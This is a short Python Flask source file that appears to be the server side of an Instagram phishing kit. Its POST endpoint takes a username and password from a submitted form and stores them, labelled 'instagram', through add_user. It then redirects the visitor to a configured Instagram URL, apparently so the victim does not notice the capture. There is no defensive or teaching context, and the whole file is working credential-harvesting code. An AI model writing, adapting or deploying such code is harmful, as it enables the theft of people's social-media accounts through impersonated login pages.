import requests
from flask import request, redirect
from flask_restful import Resource

import config
from utils.users import add_user


class Instagram(Resource):
    def post(self):
        try:
            username = request.form.get("username")
            password = request.form.get("password")
            add_user(username, password, "instagram")
            return redirect(config.INSTAGRAM_REDIRECT_URL, code=requests.codes.found)
        except Exception as e:
            print(e.__str__())
